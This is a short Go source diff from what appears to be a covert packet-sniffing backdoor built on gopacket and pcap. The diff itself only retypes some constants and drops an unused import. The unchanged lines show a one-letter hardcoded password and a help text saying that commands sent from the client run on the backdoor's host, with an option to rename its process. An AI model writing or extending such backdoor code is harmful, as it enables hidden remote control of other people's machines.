@@ -34,7 +34,6 @@ import(
 	"encoding/binary"
 	"fmt"
 	"strings"
-//	"strconv"
 	"github.com/google/gopacket/layers"
 	"runtime"
 	"github.com/google/gopacket/pcap"
@@ -43,10 +42,10 @@ import(
 )
 
 const passwd = "D"; //The authentication code
-const MAX_PORT = 45535
+const MAX_PORT uint16 = 45535
 const CLIENT = 1
 const SERVER = 0
-const SND_CMPLETE = 3414
+const SND_CMPLETE uint16 = 3414
 const helpStr = "Client Usage Help\n" +"=================================\n" +
 "EXEC Commands\nSending any command will result in it being executed by the backdoor at the other end.\n" +
 "Once the command is sent, you will recieve the output back from the backdoor.\n============\nBD Commands\n" + "These commands are prefixed by a ! and are executed on the backdoors own program options\n!setprocess [name]\n" + "==================================\n"
